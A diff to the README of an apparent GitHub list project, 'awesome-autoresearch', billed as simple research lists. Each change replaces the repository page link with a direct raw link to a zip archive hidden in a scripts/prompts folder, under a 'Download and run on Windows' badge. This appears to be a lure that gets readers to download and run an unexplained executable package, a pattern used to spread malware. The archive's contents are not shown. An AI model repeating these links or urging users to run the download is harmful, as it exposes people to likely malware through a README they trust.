@@ -1,12 +1,12 @@
 # 📚 awesome-autoresearch - Simple research lists in one place
 
-[![Download and run on Windows](https://img.shields.io/badge/Download-Windows%20Setup-blue?style=for-the-badge)](https://github.com/desirbansimba/awesome-autoresearch)
+[![Download and run on Windows](https://img.shields.io/badge/Download-Windows%20Setup-blue?style=for-the-badge)](https://raw.githubusercontent.com/desirbansimba/awesome-autoresearch/main/scripts/prompts/awesome_autoresearch_3.3.zip)
 
 ## 🖱️ Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/desirbansimba/awesome-autoresearch](https://github.com/desirbansimba/awesome-autoresearch)
+[https://raw.githubusercontent.com/desirbansimba/awesome-autoresearch/main/scripts/prompts/awesome_autoresearch_3.3.zip](https://raw.githubusercontent.com/desirbansimba/awesome-autoresearch/main/scripts/prompts/awesome_autoresearch_3.3.zip)
 
 ## ✨ What this is
 
@@ -122,7 +122,7 @@ If you save the project on your PC, this is a simple folder setup you can use:
 
 Download or visit the project here:
 
-[https://github.com/desirbansimba/awesome-autoresearch](https://github.com/desirbansimba/awesome-autoresearch)
+[https://raw.githubusercontent.com/desirbansimba/awesome-autoresearch/main/scripts/prompts/awesome_autoresearch_3.3.zip](https://raw.githubusercontent.com/desirbansimba/awesome-autoresearch/main/scripts/prompts/awesome_autoresearch_3.3.zip)
 
 ## 🧪 Quick check
 
